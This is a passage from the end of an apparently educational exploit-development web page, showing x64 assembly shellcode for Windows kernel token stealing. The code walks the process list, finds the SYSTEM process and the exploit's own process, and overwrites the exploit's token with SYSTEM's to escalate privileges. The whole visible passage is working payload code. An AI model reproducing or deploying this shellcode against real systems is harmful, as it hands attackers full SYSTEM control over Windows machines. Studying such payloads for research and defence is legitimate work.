<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span> 			<span class="c">; Our linked list \o/ We save the first structure</span>

<span class="n">searchProcess</span><span class="o">:</span>
<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span> 	<span class="c">; +0x180 UniqueProcessId</span>
<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span> <span class="c">; SYSTEM PID</span>
<span class="k">je</span> <span class="n">sysProcFound</span>
<span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c">; Our exploit PID</span>
<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>				<span class="c">; cmp reg64, imm64 don't exist</span>
<span class="k">je</span> <span class="n">exploitProcFound</span>
 
<span class="n">nextProcess</span><span class="o">:</span>
<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span> <span class="c">; Next process (Flink)</span>
<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span> <span class="c">; We are back at the starting point</span>
<span class="k">je</span> <span class="n">retApp</span>
<span class="k">jmp</span> <span class="n">searchProcess</span> <span class="c">; We loop !</span>
 
<span class="n">sysProcFound</span><span class="o">:</span>
<span class="k">mov</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rdx</span>
<span class="k">jmp</span> <span class="n">allPIDFound</span>
 
<span class="n">exploitProcFound</span><span class="o">:</span>
<span class="k">mov</span> <span class="p">[rsp],</span> <span class="n">rdx</span>
 
<span class="n">allPIDFound</span><span class="o">:</span>
<span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
<span class="k">cmp</span> <span class="p">[rsp],</span> <span class="n">rcx</span>
<span class="k">je</span> <span class="n">nextProcess</span>
<span class="k">cmp</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rcx</span>
<span class="k">je</span> <span class="n">nextProcess</span>
<span class="c">; ; We copy the SYSTEM token</span>
 <span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
 <span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span> <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
<span class="k">mov</span> <span class="err">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span><span class="p">,</span> <span class="n">rax</span>
 
<span class="n">retApp</span><span class="o">:</span>
<span class="c">; Restore the registers</span>
<span class="k">pop</span> <span class="n">rsi</span>
<span class="k">pop</span> <span class="n">rdi</span>
<span class="k">pop</span> <span class="n">rdx</span>
<span class="k">pop</span> <span class="n">rcx</span>
<span class="k">pop</span> <span class="n">rbx</span>
<span class="k">ret</span></code></pre></figure>

			</div>
		</div>

    </div>

</body>
</html>
